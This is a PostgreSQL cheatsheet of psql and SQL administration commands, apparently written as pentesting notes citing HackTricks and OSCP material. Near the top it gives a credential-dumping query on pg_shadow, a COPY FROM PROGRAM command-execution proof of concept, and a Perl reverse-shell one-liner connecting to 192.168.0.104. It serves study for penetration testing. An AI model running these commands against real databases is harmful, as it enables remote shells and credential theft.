# PostgreSQL Cheatsheet

**Warning parts of this article were created with ChatGTP 3.5 and human consultation of the [PostgreSQL Documentation](https:--www.postgresql.org/docs/)**

```sql
psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>

postgres=# \? -- Get Help
postgres=# \list                     -- list all databases
postgres=# \l                        -- Shortform List databases 
postgres=# \c                        -- use database
postgres=# \c <DATABASE>             -- use specific database
postgres=# \s                        -- command history
postgres=# \q                        -- quit
<DATABASE>=# \dt                     -- list tables from current schema
<DATABASE>=# \dt *.*                 -- list tables from all schema
<DATABASE>=# \dt+ -- show size and description
<DATABASE>=# \du                     -- list users roles
<DATABASE>=# \du+                    -- list users roles
<DATABASE>=# SELECT user;            -- get current user
<DATABASE>=# TABLE <TABLE>;          -- select table
<DATABASE>=# SELECT * FROM users;    -- select everything from users table
<DATABASE>=# SHOW rds.extensions;    -- list installed extensions
<DATABASE>=# SELECT usename, passwd from pg_shadow;    -- read credentials
<DATABASE>=# select * from TabLeNameHeRE -- Case insensitive
```

[HackTricks](https:--book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce) states that *"Since [version 9.3](https:--www.postgresql.org/docs/9.3/release-9-3.html) only **super users** and member of the group `**pg_execute_server_program**` can use copy for RCE.

```sql
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

#### More Administrative Commands

Creating and Managing Databases
```sql
-- Create a new database
CREATE DATABASE database_name;
-- Drop a database
DROP DATABASE database_name;
-- Create a new table
CREATE TABLE table_name (
    column_name1 datatype,
    column_name2 datatype,
    ...
);
```

Creating and Managing Databases 
```sql
-- Delete a table
DROP TABLE table_name;
-- Insert data into a table
INSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...);
```

Querying Data 
```sql
-- Retrieve all records from a table
SELECT * FROM table_name;
-- Retrieve specific columns and filter results
SELECT column1, column2 FROM table_name WHERE condition;
-- Aggregate functions (e.g., SUM, AVG, COUNT)
SELECT AVG(column) FROM table_name;
-- Joining tables
SELECT column1, column2 FROM table1 JOIN table2 ON table1.column = table2.column;
```

Updating and Deleting
```sql
-- Update records
UPDATE table_name SET column = value WHERE condition;
-- Delete records
DELETE FROM table_name WHERE condition;
```

Indexes
```sql
-- Create an index
CREATE INDEX index_name ON table_name (column_name);
-- Drop an index
DROP INDEX index_name;
```

User Management
```sql
-- Create a new user
CREATE USER username WITH PASSWORD 'password';
-- Grant privileges to a user
GRANT privilege ON table_name TO username;
-- Revoke privileges from a user
REVOKE privilege ON table_name FROM username;
-- Change a user's password
ALTER USER username WITH PASSWORD 'new_password';
```

Backup and Restore
```bash
# Create a backup
pg_dump -h hostname -d database_name -U username -f backup.sql
# Restore from backup
psql -h hostname -d database_name -U username -f backup.sql
```


## References

[PostgreSQL Documentation](https:--www.postgresql.org/docs/)
[postgresqltutorial](https:--www.postgresqltutorial.com/postgresql-administration/postgresql-show-tables/)
[0xsyr0](https:--github.com/0xsyr0/OSCP#postgresql) 
[HackTricks](https:--book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce)